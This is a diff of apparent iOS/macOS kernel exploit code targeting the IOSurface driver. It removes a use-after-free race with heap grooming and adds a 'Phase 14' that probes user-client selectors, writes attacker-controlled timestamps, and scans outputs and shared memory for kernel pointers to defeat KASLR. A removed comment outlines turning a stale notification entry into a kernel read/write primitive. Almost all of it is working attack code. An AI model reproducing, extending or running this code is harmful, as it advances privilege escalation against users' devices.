@@ -20092,20 +20092,7 @@ new_modes:
                     }
 
                     rlog("  r=229: Matched surface kept alive. Proceeding to Phase 14...\n");
-
-                    /* TODO: Phase 14 — kernel R/W primitive construction
-                     * The stale notification entry points to r229_spray[r229_match_idx].
-                     * Every compositor frame, dispatch reads surface+0xD8 (lock),
-                     * calls inner(surface, data, &buf) which returns 0 (no callbacks).
-                     *
-                     * Attack plan:
-                     * 1. We control the matched IOSurface via userspace APIs
-                     * 2. The stale entry's dispatch accesses our surface each frame
-                     * 3. Free the matched surface, reclaim with controlled data to
-                     *    redirect the lock pointer at +0xD8 → controlled write
-                     * 4. Or: set callback_count (+0x110) > 0 via Metal compositor
-                     *    registration to make inner() follow our callback array
-                     */
+                    /* Phase 14 uses r229_spray[r229_match_idx] directly */
                 } else {
                     /* Clean up any remaining spray surfaces */
                     for (int si = 0; si < 256; si++) {
@@ -20154,288 +20141,268 @@ new_modes:
         rlog("--- Phase 13 complete ---\n");
 
         /*
-         * Phase 14: Concurrent groom + race (controlled UAF)
+         * Phase 14: IOSurface selector probe + kernel R/W primitive
          *
-         * Phase 13 caused a watchdog reset — the race corrupted the registry
-         * and the GPU workloop hung in an infinite walk. To turn this into a
-         * controlled primitive, we groom CONCURRENTLY with the race so the
-         * kernel reads our fake entry (with NULL next pointer to terminate the
-         * walk) instead of corrupted data.
-         *
-         * The fake entry at kalloc.24:
-         *   +0x00: 0x1 (refcnt — keep alive, don't free)
-         *   +0x08: 0x0 (next pointer — NULL terminates linked list walk)
-         *   +0x10: 0x0 (zero — safe, no wild write)
-         *
-         * Process-level watchdog: self-terminate at 10s to prevent another
-         * hardware watchdog reset.
+         * After MTE brute-force success, we have a matched spray surface that
+         * the stale notification entry points to. Probe all IOSurface user
+         * client selectors to:
+         * 1. Find KASLR leak (returned data containing kernel pointers)
+         * 2. Test indexed timestamp write (sel 33) and use_count read (sel 16)
+         * 3. Probe property get/set for kernel state leakage
+         * 4. Map the matched surface's pixel buffer for shared memory R/W
          */
-        rlog("\n--- Phase 14: Concurrent groom + race (controlled UAF) ---\n");
+        rlog("\n--- Phase 14: IOSurface selector probe + kernel R/W ---\n");
         {
-            /* Process watchdog — kill self before hardware watchdog fires */
-            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC),
-                dispatch_get_global_queue(0, 0), ^{
-                    rlog("  WATCHDOG: 10s limit — terminating to prevent device hang\n");
-                    if (g_log) { fclose(g_log); g_log = NULL; }
-                    _exit(42);
-                });
-
             io_service_t svc14 = IOServiceGetMatchingService(kIOMasterPortDefault,
                 IOServiceMatching("IOSurfaceRoot"));
             if (!svc14) { rlog("  Phase 14: service lookup failed\n"); goto phase14_done; }
 
-            int p14_shape = 1; /* known good from Phase 9 */
-
-            /* Open groom connection */
-            io_connect_t gc14 = IO_OBJECT_NULL;
-            if (IOServiceOpen(svc14, mach_task_self(), 0, &gc14) != KERN_SUCCESS) {
-                rlog("  Phase 14: groom conn failed\n");
+            io_connect_t uc14 = IO_OBJECT_NULL;
+            if (IOServiceOpen(svc14, mach_task_self(), 0, &uc14) != KERN_SUCCESS) {
+                rlog("  Phase 14: user client open failed\n");
+                IOObjectRelease(svc14);
                 goto phase14_done;
             }
 
-            /* Start render loop */
-            p13_render_run = 1;
-            p13_render_frames = 0;
-            pthread_t render_th14;
-            pthread_create(&render_th14, NULL, p13_render_loop, NULL);
-            usleep(300000);
-            rlog("  Render loop running, frames=%d\n", p13_render_frames);
+            /* 14a: Probe selectors 0-40 with surface ID as scalar input */
+            rlog("  14a: IOSurface selector probe (sel 0-40)\n");
+            IOSurfaceID match_id = 0;
+            IOSurfaceRef match_surf = NULL;
 
-            /* Test 14a: v_race8 with CONCURRENT grooming (safe fake entry) */
-            rlog("  14a: v_race8 + concurrent safe groom (5 iters)\n");
-            uint64_t inp14[3] = {1, 2, 3};
-            for (int iter = 0; iter < 5; iter++) {
-                io_connect_t cs[8];
-                int have[8];
-                for (int i = 0; i < 8; i++) {
-                    have[i] = (IOServiceOpen(svc14, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
-                    if (have[i]) {
-                        mach_port_t twp = MACH_PORT_NULL;
-                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
-                        mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
-                        uint64_t ref = 0x1122334455667788ULL;
-                        IOConnectCallAsyncMethod(cs[i], 17, twp, &ref, 1,
-                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-                        mach_port_deallocate(mach_task_self(), twp);
-                    } else cs[i] = IO_OBJECT_NULL;
+            if (rounds == 229 && r229_match_idx >= 0 && r229_spray[r229_match_idx]) {
+                match_surf = r229_spray[r229_match_idx];
+                match_id = IOSurfaceGetID(match_surf);
+                rlog("    Matched surface: idx=%d id=%u addr=%p\n",
+                    r229_match_idx, match_id, (void *)match_surf);
+
+                /* Lock and get pixel buffer base address */
+                IOSurfaceLock(match_surf, 0, NULL);
+                void *base_addr = IOSurfaceGetBaseAddress(match_surf);
+                size_t alloc_size = IOSurfaceGetAllocSize(match_surf);
+                int width = (int)IOSurfaceGetWidth(match_surf);
+                int height = (int)IOSurfaceGetHeight(match_surf);
+                int bpr = (int)IOSurfaceGetBytesPerRow(match_surf);
+                rlog("    Pixel buffer: base=%p size=%zu %dx%d bpr=%d\n",
+                    base_addr, alloc_size, width, height, bpr);
+                IOSurfaceUnlock(match_surf, 0, NULL);
+            }
+
+            for (uint32_t sel = 0; sel <= 40; sel++) {
+                if (sel == 17 || sel == 18) continue; /* skip reg/dereg */
+
+                uint64_t si[6] = {0};
+                uint32_t sic = 0;
+                uint8_t struct_in[256];
+                memset(struct_in, 0, sizeof(struct_in));
+                size_t struct_in_sz = 0;
+                uint64_t so[6] = {0};
+                uint32_t soc = 6;
+                uint8_t struct_out[4096];
+                memset(struct_out, 0, sizeof(struct_out));
+                size_t struct_out_sz = sizeof(struct_out);
+
+                /* Different calling conventions per selector */
+                if (sel == 9 || sel == 10) {
+                    /* s_set_value / s_get_value: scalar[0]=surfaceID */
+                    si[0] = match_id;
+                    sic = 1;
+                } else if (sel == 16) {
+                    /* get_surface_use_count: scalar[0]=surfaceID */
+                    si[0] = match_id;
+                    sic = 1;
+                } else if (sel == 33) {
+                    /* s_set_indexed_timestamp: scalar[0]=surfaceID, scalar[1]=index, scalar[2]=timestamp */
+                    si[0] = match_id;
+                    si[1] = 0;
+                    si[2] = 0x4141414142424242ULL;
+                    sic = 3;
+                } else if (sel == 34) {
+                    /* s_lookup_surface_from_port: (needs Mach port) */
+                    continue;
+                } else {
+                    si[0] = match_id;
+                    sic = 1;
                 }
 
-                /* Start spam */
-                p13_spam_run = 1;
-                p13_spam_conn = have[0] ? cs[0] : IO_OBJECT_NULL;
-                p13_spam_shape = p14_shape;
-                p13_spam_count = 0;
-                pthread_t spam_th14[4];
-                for (int t = 0; t < 4; t++)
-                    pthread_create(&spam_th14[t], NULL, p13_spam_reg, NULL);
+                kern_return_t kr = IOConnectCallMethod(uc14, sel,
+                    si, sic, struct_in_sz ? struct_in : NULL, struct_in_sz,
+                    so, &soc, struct_out, &struct_out_sz);
 
-                /* Concurrent groomer: continuously fill freed 24-byte slots */
-                /* Truly safe fake entry: ALL ZERO (slot 0 is next pointer) */
-                uint8_t safe_fake[24];
-                memset(safe_fake, 0, sizeof(safe_fake));
-                /* All slots = 0 → next=NULL terminates GPU walk */
-
-                mach_port_t groom_wps[128];
-                int groom_n = 0;
-                uint64_t gref = 0xA1B2C3D4E5F60708ULL;
-
-                /* Pre-groom: fill some slots before the close */
-                for (int g = 0; g < 64; g++) {
-                    mach_port_t gwp = MACH_PORT_NULL;
-                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
-                    mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
-                    IOConnectCallAsyncMethod(gc14, 1000, gwp, &gref, 1,
-                        NULL, 0, safe_fake, 24, NULL, NULL, NULL, NULL);
-                    groom_wps[groom_n++] = gwp;
-                }
-
-                /* Staggered close — race window + interleaved groom */
-                for (int r = 0; r < 3; r++)
-                    for (int i = 0; i < 8; i++) {
-                        int j = (i * 5 + r * 3) % 8;
-                        if (have[j]) { IOServiceClose(cs[j]); have[j] = 0; }
-                        /* Groom immediately after close to fill freed slots */
-                        for (int g = 0; g < 4 && groom_n < 128; g++) {
-                            mach_port_t gwp = MACH_PORT_NULL;
-                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
-                            mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
-                            IOConnectCallAsyncMethod(gc14, 1000, gwp, &gref, 1,
-                                NULL, 0, safe_fake, 24, NULL, NULL, NULL, NULL);
-                            groom_wps[groom_n++] = gwp;
+                if (kr == KERN_SUCCESS || soc > 0 || struct_out_sz > 0) {
+                    rlog("    sel[%2u] kr=0x%x soc=%u struct_out_sz=%zu\n",
+                        sel, (uint32_t)kr, soc, struct_out_sz);
+                    if (soc > 0) {
+                        for (uint32_t i = 0; i < soc && i < 6; i++) {
+                            rlog("      so[%u] = 0x%llx", i, (unsigned long long)so[i]);
+                            if (so[i] > 0xfffffe0000000000ULL && so[i] < 0xffffffffffff0000ULL)
+                                rlog(" ** KERNEL PTR? **");
+                            rlog("\n");
                         }
-                        usleep(20 + (iter % 10) * 7);
                     }
-
-                p13_spam_run = 0;
-                for (int t = 0; t < 4; t++) pthread_join(spam_th14[t], NULL);
-                for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
-
-                /* Check: did the dup oracle change during the race? */
-                io_connect_t oc = IO_OBJECT_NULL;
-                if (IOServiceOpen(svc14, mach_task_self(), 0, &oc) == KERN_SUCCESS) {
-                    mach_port_t owp = MACH_PORT_NULL;
-                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &owp);
-                    mach_port_insert_right(mach_task_self(), owp, owp, MACH_MSG_TYPE_MAKE_SEND);
-                    uint64_t oref = 0x1122334455667788ULL;
-                    kern_return_t r1 = IOConnectCallAsyncMethod(oc, 17, owp, &oref, 1,
-                        NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-                    kern_return_t r2 = IOConnectCallAsyncMethod(oc, 17, owp, &oref, 1,
-                        NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-                    kern_return_t r3 = IOConnectCallMethod(oc, 18, NULL, 0, inp14, 24,
-                        NULL, NULL, NULL, NULL);
-                    rlog("    14a[%d] spam=%llu groom=%d post: reg=0x%x dup=0x%x dereg=0x%x\n",
-                        iter, (unsigned long long)p13_spam_count, groom_n,
-                        (uint32_t)r1, (uint32_t)r2, (uint32_t)r3);
-                    IOServiceClose(oc);
-                    mach_port_deallocate(mach_task_self(), owp);
-                }
-
-                /* Free groom */
-                for (int g = 0; g < groom_n; g++)
-                    mach_port_deallocate(mach_task_self(), groom_wps[g]);
-                usleep(100000);
-            }
-
-            /* Test 14b: single connection rapid reg/dereg race with concurrent groom + render */
-            rlog("  14b: Rapid reg/dereg race + concurrent groom (10 iters)\n");
-            for (int iter = 0; iter < 10; iter++) {
-                io_connect_t rc = IO_OBJECT_NULL;
-                if (IOServiceOpen(svc14, mach_task_self(), 0, &rc) != KERN_SUCCESS) continue;
-
-                /* Register entry */
-                mach_port_t rwp = MACH_PORT_NULL;
-                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rwp);
-                mach_port_insert_right(mach_task_self(), rwp, rwp, MACH_MSG_TYPE_MAKE_SEND);
-                uint64_t rref = 0x1122334455667788ULL;
-                IOConnectCallAsyncMethod(rc, 17, rwp, &rref, 1,
-                    NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-
-                /* Start spam on this connection */
-                p13_spam_run = 1;
-                p13_spam_conn = rc;
-                p13_spam_count = 0;
-                pthread_t spam_th14b[4];
-                for (int t = 0; t < 4; t++)
-                    pthread_create(&spam_th14b[t], NULL, p13_spam_reg, NULL);
-
-                /* Rapid dereg/re-reg cycle with interleaved groom */
-                uint8_t marker_fake[24];
-                memset(marker_fake, 0, sizeof(marker_fake));
-                uint64_t *mf = (uint64_t *)marker_fake;
-                mf[0] = 0x1;
-                mf[1] = 0xDEADFACE00000000ULL | (uint64_t)iter;
-                mf[2] = 0x0;
-
-                mach_port_t groom_wps14b[256];
-                int gn14b = 0;
-                uint64_t gref14b = 0xA1B2C3D4E5F60708ULL;
-
-                for (int r = 0; r < 20; r++) {
-                    IOConnectCallMethod(rc, 18, NULL, 0, inp14, 24,
-                        NULL, NULL, NULL, NULL);
-                    /* Immediately groom freed slot */
-                    if (gn14b < 256) {
-                        mach_port_t gwp = MACH_PORT_NULL;
-                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
-                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
-                        IOConnectCallAsyncMethod(gc14, 1000, gwp, &gref14b, 1,
-                            NULL, 0, marker_fake, 24, NULL, NULL, NULL, NULL);
-                        groom_wps14b[gn14b++] = gwp;
+                    if (struct_out_sz > 0 && struct_out_sz <= 256) {
+                        uint64_t *p = (uint64_t *)struct_out;
+                        for (size_t i = 0; i < struct_out_sz / 8; i++) {
+                            if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL)
+                                rlog("      struct[%zu] = 0x%llx ** KERNEL PTR? **\n",
+                                    i * 8, (unsigned long long)p[i]);
+                        }
                     }
-                    IOConnectCallAsyncMethod(rc, 17, rwp, &rref, 1,
-                        NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-                    usleep(50);
-                }
-
-                p13_spam_run = 0;
-                for (int t = 0; t < 4; t++) pthread_join(spam_th14b[t], NULL);
-
-                /* Oracle check: dup should return 0xC9 for live entry.
-                   If it returns something else, the race hit */
-                kern_return_t rdup = IOConnectCallAsyncMethod(rc, 17, rwp, &rref, 1,
-                    NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-                kern_return_t rdereg = IOConnectCallMethod(rc, 18, NULL, 0, inp14, 24,
-                    NULL, NULL, NULL, NULL);
-                int anomaly = (rdup != 0 && rdup != (kern_return_t)0xE00002C9);
-                rlog("    14b[%d] spam=%llu groom=%d dup=0x%x dereg=0x%x %s\n",
-                    iter, (unsigned long long)p13_spam_count, gn14b,
-                    (uint32_t)rdup, (uint32_t)rdereg,
-                    anomaly ? "** ANOMALY **" : "normal");
-
-                IOServiceClose(rc);
-                mach_port_deallocate(mach_task_self(), rwp);
-                for (int g = 0; g < gn14b; g++)
-                    mach_port_deallocate(mach_task_self(), groom_wps14b[g]);
-                usleep(50000);
-            }
-
-            /* Test 14c: stale-read oracle DURING render loop (content-dependence recheck) */
-            rlog("  14c: Content-dependence oracle during render loop\n");
-            {
-                io_connect_t cc = IO_OBJECT_NULL;
-                if (IOServiceOpen(svc14, mach_task_self(), 0, &cc) == KERN_SUCCESS) {
-                    mach_port_t cwp = MACH_PORT_NULL;
-                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &cwp);
-                    mach_port_insert_right(mach_task_self(), cwp, cwp, MACH_MSG_TYPE_MAKE_SEND);
-                    uint64_t cref = 0x1122334455667788ULL;
-                    uint64_t cgref = 0xA1B2C3D4E5F60708ULL;
-
-                    /* Test A: groom with marker=0xAABBCCDD */
-                    uint8_t fa[24]; memset(fa, 0, sizeof(fa));
-                    uint64_t *fap = (uint64_t *)fa;
-                    fap[0] = 0x21; fap[1] = 0xAABBCCDDEEFF0011ULL;
-                    int hits_a = 0;
-                    for (int i = 0; i < 5; i++) {
-                        IOConnectCallAsyncMethod(cc, 17, cwp, &cref, 1,
-                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-                        IOConnectCallMethod(cc, 18, NULL, 0, inp14, 24,
-                            NULL, NULL, NULL, NULL);
-                        /* groom */
-                        mach_port_t gwp = MACH_PORT_NULL;
-                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
-                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
-                        IOConnectCallAsyncMethod(gc14, 1000, gwp, &cgref, 1,
-                            NULL, 0, fa, 24, NULL, NULL, NULL, NULL);
-                        kern_return_t rd = IOConnectCallAsyncMethod(cc, 17, cwp, &cref, 1,
-                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-                        if (rd != (kern_return_t)0xE00002C9) hits_a++;
-                        mach_port_deallocate(mach_task_self(), gwp);
-                        usleep(2000);
-                    }
-
-                    /* Test B: groom with zero buffer */
-                    uint8_t fb[24]; memset(fb, 0, sizeof(fb));
-                    int hits_b = 0;
-                    for (int i = 0; i < 5; i++) {
-                        IOConnectCallAsyncMethod(cc, 17, cwp, &cref, 1,
-                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-                        IOConnectCallMethod(cc, 18, NULL, 0, inp14, 24,
-                            NULL, NULL, NULL, NULL);
-                        mach_port_t gwp = MACH_PORT_NULL;
-                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
-                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
-                        IOConnectCallAsyncMethod(gc14, 1000, gwp, &cgref, 1,
-                            NULL, 0, fb, 24, NULL, NULL, NULL, NULL);
-                        kern_return_t rd = IOConnectCallAsyncMethod(cc, 17, cwp, &cref, 1,
-                            NULL, 0, inp14, 24, NULL, NULL, NULL, NULL);
-                        if (rd != (kern_return_t)0xE00002C9) hits_b++;
-                        mach_port_deallocate(mach_task_self(), gwp);
-                        usleep(2000);
-                    }
-
-                    rlog("    14c marker-groom hits=%d/5, zero-groom hits=%d/5 %s\n",
-                        hits_a, hits_b,
-                        (hits_a != hits_b) ? "** CONTENT-DEPENDENT **" : "(same = not content-dep)");
-                    IOServiceClose(cc);
-                    mach_port_deallocate(mach_task_self(), cwp);
+                } else if (kr != (kern_return_t)0xE00002C2 &&
+                           kr != (kern_return_t)0xE00002BC) {
+                    /* Log non-trivial errors (skip badArg and unsupported) */
+                    rlog("    sel[%2u] kr=0x%x\n", sel, (uint32_t)kr);
                 }
             }
 
-            /* Stop render loop */
-            p13_render_run = 0;
-            pthread_join(render_th14, NULL);
-            rlog("  Render loop stopped, frames=%d\n", p13_render_frames);
-            if (gc14) IOServiceClose(gc14);
+            /* 14b: Test IOSurface property read for kernel pointer leaks */
+            rlog("  14b: IOSurface property probe\n");
+            if (match_surf) {
+                /* Set a marker property */
+                int marker = 0xDEADBEEF;
+                CFNumberRef marker_val = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                IOSurfaceSetValue(match_surf, CFSTR("TestMarker"), marker_val);
+                CFRelease(marker_val);
+
+                /* Read all properties */
+                CFDictionaryRef all_props = IOSurfaceCopyAllValues(match_surf);
+                if (all_props) {
+                    CFIndex count = CFDictionaryGetCount(all_props);
+                    rlog("    Surface has %ld properties\n", (long)count);
+
+                    const void **keys = (const void **)malloc(count * sizeof(void *));
+                    const void **vals = (const void **)malloc(count * sizeof(void *));
+                    CFDictionaryGetKeysAndValues(all_props, keys, vals);
+
+                    for (CFIndex i = 0; i < count; i++) {
+                        char key_buf[256] = {0};
+                        if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                            CFStringGetCString(keys[i], key_buf, sizeof(key_buf), kCFStringEncodingUTF8);
+
+                        if (CFGetTypeID(vals[i]) == CFNumberGetTypeID()) {
+                            int64_t v = 0;
+                            CFNumberGetValue(vals[i], kCFNumberSInt64Type, &v);
+                            uint64_t uv = (uint64_t)v;
+                            if (uv > 0xfffffe0000000000ULL && uv < 0xffffffffffff0000ULL)
+                                rlog("    ** KASLR? ** prop '%s' = 0x%llx\n",
+                                    key_buf, (unsigned long long)uv);
+                            else if (uv > 0x100000 && key_buf[0])
+                                rlog("    prop '%s' = 0x%llx\n", key_buf, (unsigned long long)uv);
+                        } else if (CFGetTypeID(vals[i]) == CFDataGetTypeID()) {
+                            CFDataRef dv = (CFDataRef)vals[i];
+                            CFIndex len = CFDataGetLength(dv);
+                            const uint8_t *bytes = CFDataGetBytePtr(dv);
+                            rlog("    prop '%s' = data[%ld]", key_buf, (long)len);
+                            if (len >= 8) {
+                                uint64_t *p = (uint64_t *)bytes;
+                                for (CFIndex j = 0; j < len / 8 && j < 8; j++) {
+                                    if (p[j] > 0xfffffe0000000000ULL && p[j] < 0xffffffffffff0000ULL)
+                                        rlog(" ** KASLR@%ld:0x%llx **", (long)(j*8), (unsigned long long)p[j]);
+                                }
+                            }
+                            rlog("\n");
+                        }
+                    }
+                    free(keys);
+                    free(vals);
+                    CFRelease(all_props);
+                }
+
+                /* Remove marker */
+                IOSurfaceRemoveValue(match_surf, CFSTR("TestMarker"));
+            }
+
+            /* 14c: Test selector 33 (s_set_indexed_timestamp) with index 0 */
+            rlog("  14c: Testing s_set_indexed_timestamp (sel 33)\n");
+            if (match_id) {
+                for (int idx = 0; idx < 4; idx++) {
+                    uint64_t ts_in[3] = { match_id, (uint64_t)idx, 0x4141414100000000ULL | idx };
+                    uint64_t ts_out[2] = {0};
+                    uint32_t ts_oc = 2;
+                    kern_return_t kr = IOConnectCallMethod(uc14, 33,
+                        ts_in, 3, NULL, 0, ts_out, &ts_oc, NULL, NULL);
+                    rlog("    set_timestamp[%d] kr=0x%x oc=%u out0=0x%llx out1=0x%llx\n",
+                        idx, (uint32_t)kr, ts_oc,
+                        (unsigned long long)ts_out[0], (unsigned long long)ts_out[1]);
+                }
+
+                /* Read timestamps back via selector for get_indexed_timestamp */
+                for (uint32_t gsel = 32; gsel <= 35; gsel++) {
+                    if (gsel == 33) continue;
+                    uint64_t gi[2] = { match_id, 0 };
+                    uint64_t go[4] = {0};
+                    uint32_t goc = 4;
+                    kern_return_t kr = IOConnectCallMethod(uc14, gsel,
+                        gi, 2, NULL, 0, go, &goc, NULL, NULL);
+                    if (kr == KERN_SUCCESS || goc > 0) {
+                        rlog("    sel[%u](get) kr=0x%x oc=%u", gsel, (uint32_t)kr, goc);
+                        for (uint32_t i = 0; i < goc; i++)
+                            rlog(" o%u=0x%llx", i, (unsigned long long)go[i]);
+                        rlog("\n");
+                    }
+                }
+            }
+
+            /* 14d: Test selector 16 (get_surface_use_count) */
+            rlog("  14d: Testing get_surface_use_count (sel 16)\n");
+            if (match_id) {
+                uint64_t uc_in[1] = { match_id };
+                uint64_t uc_out[2] = {0};
+                uint32_t uc_oc = 2;
+                kern_return_t kr = IOConnectCallMethod(uc14, 16,
+                    uc_in, 1, NULL, 0, uc_out, &uc_oc, NULL, NULL);
+                rlog("    use_count kr=0x%x oc=%u out0=0x%llx out1=0x%llx\n",
+                    (uint32_t)kr, uc_oc,
+                    (unsigned long long)uc_out[0], (unsigned long long)uc_out[1]);
+            }
+
+            /* 14e: Scan matched surface shared memory for kernel pointers */
+            rlog("  14e: Scanning shared memory mapping for kernel data\n");
+            if (match_surf) {
+                IOSurfaceLock(match_surf, kIOSurfaceLockReadOnly, NULL);
+                void *base = IOSurfaceGetBaseAddress(match_surf);
+                size_t sz = IOSurfaceGetAllocSize(match_surf);
+                if (base && sz > 0) {
+                    uint64_t *p = (uint64_t *)base;
+                    int kern_ptrs = 0;
+                    for (size_t i = 0; i < sz / 8 && i < 1024; i++) {
+                        if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL) {
+                            rlog("    shm[0x%zx] = 0x%llx ** KERNEL PTR **\n",
+                                i * 8, (unsigned long long)p[i]);
+                            kern_ptrs++;
+                        }
+                    }
+                    if (!kern_ptrs)
+                        rlog("    No kernel pointers in shared memory (expected for pixel buffer)\n");
+                }
+                IOSurfaceUnlock(match_surf, kIOSurfaceLockReadOnly, NULL);
+            }
+
+            /* 14f: Probe IOSurface client connection for KASLR via struct output */
+            rlog("  14f: Struct output probe for KASLR\n");
+            for (uint32_t sel = 0; sel <= 15; sel++) {
+                uint64_t si[4] = { match_id, 0, 0, 0 };
+                uint8_t sout[4096];
+                memset(sout, 0, sizeof(sout));
+                size_t sout_sz = sizeof(sout);
+                uint64_t so[6] = {0};
+                uint32_t soc = 0;
+                kern_return_t kr = IOConnectCallMethod(uc14, sel,
+                    si, 1, NULL, 0, so, &soc, sout, &sout_sz);
+                if (kr == KERN_SUCCESS && sout_sz > 0) {
+                    rlog("    sel[%2u] struct_out=%zu bytes\n", sel, sout_sz);
+                    uint64_t *p = (uint64_t *)sout;
+                    for (size_t i = 0; i < sout_sz / 8 && i < 32; i++) {
+                        if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL)
+                            rlog("      +0x%zx = 0x%llx ** KASLR LEAK **\n",
+                                i*8, (unsigned long long)p[i]);
+                        else if (p[i] > 0xffff000000000000ULL)
+                            rlog("      +0x%zx = 0x%llx (high)\n",
+                                i*8, (unsigned long long)p[i]);
+                    }
+                }
+            }
+
+            IOServiceClose(uc14);
             IOObjectRelease(svc14);
         }
         phase14_done:
